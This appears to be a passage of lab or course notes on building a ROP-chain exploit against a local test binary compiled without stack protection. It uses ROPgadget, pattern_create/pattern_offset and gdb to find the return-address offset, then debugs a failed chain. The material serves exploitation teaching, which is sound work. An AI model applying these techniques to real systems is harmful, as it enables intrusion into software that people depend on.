# Let's give a simpler example a go

```
clang -static -fno-stack-protector -o target target.c
```

```
ROPgadget --binary target
```

```
ROPgadget --ropchain --binary target
```

To add the right number of padding bytes we need to know the offset of the return pointer - but this we've done before

```
$ pattern_create -l 100
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
```

```
gdb -q target
Reading symbols from target...(no debugging symbols found)...done.
(gdb) disass main
Dump of assembler code for function main:
   0x0000000000400b30 <+0>: 	push   %rbp
   0x0000000000400b31 <+1>: 	mov    %rsp,%rbp
   0x0000000000400b34 <+4>: 	sub    $0x40,%rsp
   0x0000000000400b38 <+8>: 	movl   $0x0,-0x4(%rbp)
   0x0000000000400b3f <+15>:	mov    %edi,-0x8(%rbp)
   0x0000000000400b42 <+18>:	mov    %rsi,-0x10(%rbp)
   0x0000000000400b46 <+22>:	cmpl   $0x2,-0x8(%rbp)
   0x0000000000400b4a <+26>:	jl     0x400b65 <main+53>
   0x0000000000400b50 <+32>:	lea    -0x30(%rbp),%rdi
   0x0000000000400b54 <+36>:	mov    -0x10(%rbp),%rax
   0x0000000000400b58 <+40>:	mov    0x8(%rax),%rsi
   0x0000000000400b5c <+44>:	callq  0x4003f0
   0x0000000000400b61 <+49>:	mov    %rax,-0x38(%rbp)
   0x0000000000400b65 <+53>:	xor    %eax,%eax
   0x0000000000400b67 <+55>:	add    $0x40,%rsp
   0x0000000000400b6b <+59>:	pop    %rbp
   0x0000000000400b6c <+60>:	retq   
End of assembler dump.
(gdb) br *main+60
Breakpoint 1 at 0x400b6c
(gdb) r Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A

Breakpoint 1, 0x0000000000400b6c in main ()
(gdb) x/1xg $sp
0x7fffffffdc08:	0x4130634139624138
```

```
pattern_offset -q 4130634139624138
[*] Exact match at offset 56
```

```
$ ./target $(./chain.py)
Segmentation fault (core dumped)
```

To debug try:

```
./chain.py > file
xxd -g 8 file
```

Try to eliminate zero bytes
```
ROPgadget --ropchain --binary target --badbytes 00
```

Maybe try to build as a 32 bit binary?
```
clang -m32 -static -fno-stack-protector -o target target.c
```

And start again from the beginning - now with 32 bit. Maybe there are different bad bytes this time around? Have a look at the bytes produced in the shellcode - debug in gdb - what is going on? The offset is probably different in 32 bit...
